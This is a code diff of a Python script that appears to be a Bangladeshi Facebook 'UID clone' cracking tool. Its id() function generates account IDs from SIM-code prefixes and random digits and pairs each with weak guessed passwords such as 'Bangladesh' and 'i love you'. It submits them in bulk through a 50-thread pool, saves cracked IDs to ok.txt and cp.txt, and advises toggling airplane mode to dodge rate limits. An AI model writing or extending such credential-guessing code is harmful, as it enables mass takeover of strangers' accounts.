@@ -196,36 +196,38 @@ def clear():
 def id():
 	user=[]
 	clear()
-	#print (logo)
-	cod = input ('PUT YOUR CODE: ')
-	limit= int(input('EXAMPLE: 2000, 3000, 50000 \nPUT NUMBER OF CLONE : '))
-	for num in range(limit):
+	#print(logo)
+	print(" \033[1;32mSim Code 👉 : 016, 017, 018, 019, 014, 013")
+	kode = input(' \033[92m[\033[37m*\033[92m] \033[37m \033[1;32mEnter sim code: ')
+	doamin = ' BD Uid Clone '
+	limit = int(input(' \033[92m[\033[37m?\033[92m] \033[37m \033[1;32mNumber Add Limit : '))
+	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
 		nmp = ''.join(random.choice(string.digits) for _ in range(4))
 		user.append(nmp)
-	with ThreadPool(max_workers=30) as NAYAN:
-		clear()
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		print(logo)
 		tl = str(len(user))
-		#print (f'total user > '+tl)
-		jalan(f'\033[0;97m[{xr}√]\x1b[033;0;96m YOUR TOTAL IDS: {xr}'+tl)
-		#jalan(f'\033[0;97m[{xr}âœ“]\033[0;93m PLEASE WAIT YOUR CLONING \n[{xr}âœ“] PROCESS HAS BEEN STARTED')
-		jalan(f'\033[0;97m[{xr}√]\033[0;96m USE YOUR MOBILE DATA ')
-		jalan(f'\033[0;97m[{xr}√] \x1b[38;5;208mUse Flight Mode For Speed Up')
-		#jalan(f'\033[0;97m[{xr}âœ“] \033[0;94mSuper Fast Speed Cloning')
-		#jalan('\033[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
-		
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m \033[1;32m NAYAN Premium Mood Activated ")
+		print(f"\033[92m[\033[37m*\033[92m] \033[37m  Tool Name:\033[1;92m {doamin}")
+		print('\033[92m[\033[37m*\033[92m] \033[37m  Total ids:\033[1;92m '+tl)
+		print(f'\033[92m[\033[37m*\033[92m] \033[37m  BD Code :\033[1;92m {kode} ')
+		print('\033[92m[\033[37m*\033[92m] \033[37m  The process has been started')
+		print('\033[92m[\033[37m*\033[92m] \033[37m \033[1;93m NOTE : Fast Airplane Mode [ On/Off ] Be For Use ')
+		print(60*'=')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
-			NAYAN.submit(mbasic,uid,pwx,tl)
+			yaari.submit(a,uid,pwx,tl)
 	#print('\033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt\n\n')
 	#print('\033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 	exit()
 	
-def mbasic(uid,pwx,tl):
+def a(uid,pwx,tl):
     global loop
     global cps    
     global oks
